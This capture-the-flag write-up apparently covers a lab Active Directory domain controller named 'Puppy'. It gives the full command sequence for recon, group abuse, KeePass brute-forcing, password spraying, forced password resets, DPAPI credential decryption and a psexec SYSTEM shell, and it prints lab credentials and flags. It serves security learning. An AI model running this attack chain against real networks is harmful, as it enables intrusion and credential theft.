
## CTF Writeup: Puppy

---
## Provided Credentials

```
levi.james:KingofAkron2025!
```
## Reconnaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -n -Pn -sSCV -p- -oA nmap/puppy 10.129.232.75
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-29 15:49 -0500
Nmap scan report for 10.129.232.75
Host is up (0.018s latency).
Not shown: 65512 filtered tcp ports (no-response)
Bug in iscsi-info: no string output.
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-30 03:52:00Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
3260/tcp  open  iscsi?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc         Microsoft Windows RPC
60318/tcp open  msrpc         Microsoft Windows RPC
63267/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-30T03:53:46
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 281.06 seconds
```

The Target seems to be an Domain Controller. We get revealed the hostname "DC", the domain name itself "puppy.htb" & the FQDN "DC.puppy.htb". Let's map them to the target ip address in our local dns file.

```
echo "10.129.232.75 dc.puppy.htb puppy.htb DC" | tee -a /etc/hosts
```

Started off with downloading domain information using bloodhound.

```
bloodhound-python -u levi.james -p 'KingofAkron2025!' -ns 10.129.232.75 -d puppy.htb -c all
```

Started up bloodhound.

```
neo4j console
bloodhound-start
```

Uploaded domain information and marked current user "levi.james" as owned.

Lucky for us we can see that levi.james is part of "HR" Group, which has GenericWrite on the Developers Group. 

Before adding our current user to the Developers Group I wanted to enumerate SMB Shares.

```
nxc smb puppy.htb -u levi.james -p 'KingofAkron2025!' --shares
```

There ssems to be an non-default SMB Share called "DEV". We could potentially get read or write permissions on this share after we add our current user to the Developers group.

Added it.

```
bloodyad -u levi.james -p 'KingofAkron2025!' -d puppy.htb -H 10.129.232.75 add groupmember 'Developers' levi.james
```

After rescanning again we now seem to have read permission on the DEV SMB Share.

```
nxc smb puppy.htb -u levi.james -p 'KingofAkron2025!' --shares
```

Downloaded all the files.

```
recurse ON
prompt OFF
mget *
```

We found an KeePass Database File, but we'll need an passphrase. Let's try & utilize keepass2john and convert the database file into hash, so we can potentially bruteforce an passphrase. 

```
keepass2john.py recovery.kdbx > recovery.kdbx_hash
```

Unfortunately running hashcat or john the ripper both didn't work.

```
john recovery.kdbx_hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Decided to enumerate all domain users and stored the output inside an newusers.txt file.

```
nxc smb puppy.htb -u levi.james -p 'KingofAkron2025!' --rid-brute > newusers.txt
```

Formatted the output and stored it inside an users.txt wordlist, which we can leverage for bruteforcing.

```
grep "SidTypeUser" newusers.txt | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```

Sprayed all users wit hthe password of levi.james on smb,winrm & ldap but couldn't find another auth.

```
nxc smb puppy.htb -u users.txt -p 'KingofAkron2025!' --continue-on-success
```

Sprayed all users with the password as there username against all the services, didn't work either.

```
nxc winrm puppy.htb -u users.txt -p users.txt --continue-on-success
```

Enumerated LDAP, but couldn't find anything interesting.

```
ldapsearch -H "ldap://puppy.htb" -D levi.james@puppy.htb -w 'KingofAkron2025!' -b "dc=puppy,dc=htb" "*" > ldapsearch.txt
```

Since I was quiet stuck, because enumerating the NFS Mount failed & RPC didn't provide anything I want to go back to the shadow credentials attack. Since we are part of the developers group, we could maybe request NTLM Hashes for those users?

There is 3 users part of the developers group:

```
ant.edwards
adam.silver
jamie.williams
```

Let's try, we had to rerun the initial command which adds our current user to the Developers Group. I'm assuming there is an cleanup script in-place.

```
bloodyad -u levi.james -p 'KingofAkron2025!' -d puppy.htb -H 10.129.232.75 add groupmember 'Developers' levi.james
```

Tried multiple Shadow Credentials Attack, but those didn't work! Since we aren't authorized.

```
certipy-ad shadow auto -u 'levi.james@puppy.htb' -p 'KingofAkron2025!' -account ant.edwards -dc-ip 10.129.232.75
```

```
bloodyad --host 10.129.232.75 -d puppy.htb -u levi.james -p 'KingofAkron2025!' add shadowCredentials adam.silver
```

Also tried an targetedKerberoast Attack, but this also failed. The Error Log told us about Clock Skew Error, but even when fixing it with ntpdate it didn't work.

```
python3 /opt/arsenal/ActiveDirectory/targetedKerberoast/targetedKerberoast.py -v -d 'puppy.htb' -u 'levi.james' -p 'KingofAkron2025!' --dc-host dc.puppy.htb --request-user jamie.williams
```

Let's move back to the keepass database file.

Since hashcat doesn't support this mode yet & john the ripper clearly doesn't work for me I tried to find scripts on github & found one. This one allows me to directly bruteforce the .kdbx file instead of converting it to hash!

```
wget https://raw.githubusercontent.com/r3nt0n/keepass4brute/refs/heads/master/keepass4brute.sh
```

Ran the script & retrieved the passphrase after some time.

```
keepass4brute.sh recovery.kdbx /usr/share/wordlists/rockyou.txt
```

After a couple of seconds I retrieved the passphrase liverpool

Accessed the database file & retrieved a lot of passwords for users.

```
adam.silver:HJKL2025!
ant.edwards:Antman2025!
jamie.williams:JamieLove2025!
samuel.blake:ILY2025!
steve.tucker:Steve2025!
```

Added them to our passwords.txt wordlist. Sprayed credentials and found another authentication for user ant.edwards.

```
nxc smb puppy.htb -u users.txt -p passwords.txt --continue-on-success
```

I tried spraying user ant.edwards against winrm, but we still have no connection to the target system.

```
nxc winrm puppy.htb -u ant.edwards -p 'Antman2025!'
```

Decided to check if he has some interesting ACL's which we could leverage for privesc. Yes he has! He is part of the "Senior Devs" Group which has GenericAll on user "adam.silver". 

I tried to ForceChangePassword via rpcclient & changed it successfully.

```
rpcclient -U 'ant.edwards%Antman2025!' puppy.htb
rpcclient $> setuserinfo2 adam.silver 23 Warrior32!
```

Sprayed his credential and it worked, but the account itself seems disabled. Let's try & activate it.

```
nxc smb puppy.htb -u adam.silver -p 'Warrior32!'
```

Re-enabled the account.

```
bloodyad --host 10.129.232.75 -d puppy.htb -u ant.edwards -p 'Antman2025!' remove uac 'adam.silver' -f ACCOUNTDISABLE
```

Sprayed adam.silver against winrm and we pwned it.

```
nxc winrm puppy.htb -u adam.silver -p 'Warrior32!'
```

Connected to the DC as adam.silver via evil-winrm.

```
evil-winrm -i puppy.htb -u adam.silver -p 'Warrior32!'
```

Retrieved user.txt in C:\Users\adam.silver\Desktop.

```
7798a37e31296d8491267dee66ed8d7e
```
## Privilege Escalation

Found an interesting directory in the root of the filesystem C:\Backups. Which stored an interesting .zip file. Let's download it to our local machine.

```
download site-backup-2024-12-30.zip
```

On my local machine

Unzipped the file.

```
unzip site-backup-2024-12-30.zip
```

Retrieved an interesting .bak file.

Upon viewing it I was able to extract credentials for user steph.cooper.

```
steph.cooper:ChefSteph2025!
```

Connected to DC via evil-winrm.

```
evil-winrm -i 10.129.41.20 -u steph.cooper -p 'ChefSteph2025!'
```

Enumerated an Encrypted DPAPI Password.

```
dir -force C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials


    Directory: C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a-hs-          3/8/2025   8:14 AM          11068 DFBE70A7E5CC19A398EBF1B96859CE5D
```

This displayed the DPAPI Encrypted Password.

In order to decrypt it we need master key.

Which we can find in:

```
dir -force C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107


    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a-hs-          3/8/2025   7:40 AM            740 556a2412-1275-4ccf-b721-e6a0b4f90407                                 
-a-hs-         2/23/2025   2:36 PM             24 Preferred
```

1. Copy DPAPI Password in C:\Temp

```
copy C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9 dpapi_pass
```

2. Copy masterKey in C:\Temp

```
copy C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-
21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407 masterKey
```

3. Unhidden both files

```
attrib -h -s masterKey
attrib -h -s dpapi_pass
```

4. Download both files.

```
download dpapi_pass
download masterKey
```

5. Decrypt masterKey

This will give us the key to decrypt the DPAPI Password.

```
impacket-dpapi masterkey -file masterKey -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'
```

6. Decrypt DPAPI Password

```
impacket-dpapi credential -f dpapi_pass -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

Retrieved Credentials for steph.cooper_adm.

```
steph.cooper_adm:FivethChipOnItsWay2025!
```

Connected to the DC as admin & gained SYSTEM Shell.

```
impacket-psexec steph.cooper_adm:'FivethChipOnItsWay2025!'@puppy.htb
```

Retrieved root.txt in C:\Users\Administrator\Desktop.

```
5470a5f7ec2e746b12a68fd54f90762a
```